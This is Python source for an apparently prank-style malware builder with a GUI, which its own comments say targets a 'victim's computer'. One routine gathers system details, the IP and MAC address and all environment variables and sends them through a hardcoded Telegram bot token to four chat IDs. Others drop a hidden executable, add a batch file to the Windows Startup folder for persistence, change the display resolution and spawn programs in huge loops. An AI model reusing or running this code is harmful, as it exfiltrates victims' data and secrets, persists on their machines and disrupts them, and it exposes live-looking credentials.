
#! IMPORTING
import socket, requests, os, psutil, uuid, re, platform, subprocess, shutil, win32api, win32con
from pathlib import Path
import tkinter.filedialog
from tkinter import *

#! PATHS
# Setting/changing paths
current_file_location = os.path.abspath(__file__)
current_file_directory = os.path.dirname(current_file_location)
assets_path = f'{current_file_directory}/assets'
main_path = f'{assets_path}/frame0/'
user_directory = f'{current_file_directory}'
def relative_to_assets(path: str) -> Path:
    return main_path / Path(path)

#! VARIABLES
# Options to switch
calculator_app = False
camera_app = False
notepad_app = False
downloading_podarunek = False
desktop_destruction = False
change_wallpaper = False
cmatrix_app = False
browser_app = False
domki_grzybowskie_amount = 0

# Changing checkboxes' image
off = PhotoImage(
    file=relative_to_assets("checkbox.png"))
on = PhotoImage(
    file=relative_to_assets("checkbox_clicked.png"))

# Arrays
switchable_programs = [calculator_app, camera_app, notepad_app, downloading_podarunek, desktop_destruction, change_wallpaper ,cmatrix_app, browser_app]
buttons = []
for i in range(0, 12):
    buttons.append(None)
entries = []
for i in range(0, 2):
    entries.append(None)

#! FUNCTIONS
# Switching the True/False statement of a particular program (insert the array index of the program in buttons[])
def switchProgram(buttonNumber):
    global buttons, switchable_programs
    if switchable_programs[buttonNumber] == True:
        switchable_programs[buttonNumber] = False
        buttons[buttonNumber].config(image=off)
    else:
        switchable_programs[buttonNumber] = True
        buttons[buttonNumber].config(image=on)

# Create entry fungus on victim's computer
def domki_grzybowskie():
    global domki_grzybowskie_amount, current_file_directory
    domki_grzybowskie_amount = int(entries[1].get())
    for i in range(1,domki_grzybowskie_amount+1):
        directory = f'domek_grzybowski_{i}'
        final_directory = os.path.join(user_directory, directory)
        os.mkdir(final_directory)
def early_grzybek():
    # Copying the grzybek.exe file from assets path to user's output path
    shutil.copy(f'{main_path}to_copy/grzybek.exe', f'{user_directory}')
    os.system(f'attrib +h {user_directory}/grzybek.exe')

# Running the whole operation (on start button click)
def programs():
    global loop_program
    loop_program = int(entries[0].get())
    # Creating domki_grzybowskie & grzybek.exe (Grzybica 1.0)
    info_telegram()
    domki_grzybowskie()
    early_grzybek()
    # Programs for Linux
    if os.name == "posix":
        for i in range(0, loop_program):
            if switchable_programs[6] == True:
                subprocess.Popen(['gnome-terminal','-e','cmatrix'])
            if switchable_programs[7] == True:
                subprocess.Popen('firefox')
    # Programs for Windows
    if os.name == 'nt':
        if switchable_programs[3] == True:
            shutil.copy(f'{main_path}to_copy/podarunek.jpg', f'{user_directory}')
        if switchable_programs[5] == True:
            startup_path = os.path.expandvars('%USERPROFILE%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup')
            shutil.copy(f'{main_path}to_copy/wiadomosc.bat', f'{startup_path}')
            shutil.copy(f'{main_path}to_copy/skull.png', f'{startup_path}')
        for i in range(0, loop_program):
            if switchable_programs[4] == True:
                devmode = win32api.EnumDisplaySettings(None, win32con.ENUM_CURRENT_SETTINGS)
                devmode.PelsWidth = 1280
                devmode.PelsHeight = 720
                devmode.Fields = win32con.DM_PELSWIDTH | win32con.DM_PELSHEIGHT
                win32api.ChangeDisplaySettings(devmode, 0)
            if switchable_programs[0] == True:
                subprocess.Popen('calc.exe')
            if switchable_programs[1] == True: 
                os.system('start microsoft.windows.camera:')
            if switchable_programs[2] == True:
                subprocess.Popen('notepad.exe')
            if switchable_programs[6] == True:
                os.system('start cmd /K "cd C:/ & color 4 & dir/s"')
            if switchable_programs[7] == True:
                os.system('start microsoft-edge:https://www.youtube.com/watch?v=QX43QTYyV-8')
            if switchable_programs[3] == True:
                os.system(rf'start {user_directory}/podarunek.jpg')

# Select the output path
def select_path():
    global user_directory
    user_directory = tkinter.filedialog.askdirectory()

# Set all options to minimum/maximum
def minimum():
    global switchable_programs
    for i in range(0, 8):
        switchable_programs[i] = False
    for i in range(0, 2):
        entries[i].delete(0, END)
        entries[i].insert(0, '0')
    for i in range(0, 8):
        buttons[i].config(image=off)
def maximum():
    global switchable_programs
    for i in range(0, 8):
        switchable_programs[i] = True
    for i in range(0, 2):
        entries[i].delete(0, END)
        entries[i].insert(2000000000, '2000000000')
    for i in range(0, 8):
        buttons[i].config(image=on)

# Information collector (telegram bot)
def info_telegram():
    OS = (platform.platform())
    SYSTEM = (platform.system())
    Processor = (platform.processor())
    Release = (platform.release())
    Version = (platform.version())
    Arch = (platform.machine())
    Host = (socket.gethostname())
    IP = (socket.gethostbyname(socket.gethostname()))
    MAC = ((':'.join(re.findall('..', '%012x' % uuid.getnode()))))
    RAM = (str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB")
    #OSINF = (platform.freedesktop_os_release())
    JAVA = (platform.java_ver())
    #LIBC = (platform.libc_ver())
    NODE = (platform.node())
    PY_Comp = (platform.python_compiler())
    PY_imple = (platform.python_implementation())
    PY_vers = (platform.python_version())
    Sys_vers = (platform._sys_version())
    Win32_ed = (platform.win32_edition())
    Win32_ver = (platform.win32_ver())
    Uname = (platform.uname())

    diff = ""
    for item in os.environ:
        diff = diff + (f'{item}{" : "}{os.environ[item]}\n')

    text = (f"****INFORMATION ABOUT THIS USER:****\n\n\nOS: {OS}\nSYSTEM: {SYSTEM}\nProcessor: {Processor}\nRelease: {Release}\nArchitecture: {Arch}\nHost: {Host}\nIP: {IP}\nMAC: {MAC}\nRAM: {RAM}\nJava Version: {JAVA}\nNode: {NODE}\nPython_compiler: {PY_Comp}\nPython_implementation: {PY_imple}\nPython_version: {PY_vers}\n System Version: {Sys_vers}\nWin32_edition: {Win32_ed}\Win32_version: {Win32_ver}\nOTHER: {diff}\n\nUname: {Uname}")

    TOKEN = "5838538320:AAHm1l5dBh975LxmGEMgEs1CQ3Fr7TBeMiY"
    chat_id_Eltertate = "1036212352"
    chat_id_Mucha = "6049466485"
    chat_id_Fabian = "6281778787"
    chat_id_Tymek = "5969999455"
    message = text

    url1 = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id_Eltertate}&text={message}"
    print(requests.get(url1).json())
    url2 = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id_Fabian}&text={message}"
    print(requests.get(url2).json())
    url3 = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id_Mucha}&text={message}"
    print(requests.get(url3).json())
    url4 = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id_Tymek}&text={message}"
    print(requests.get(url4).json())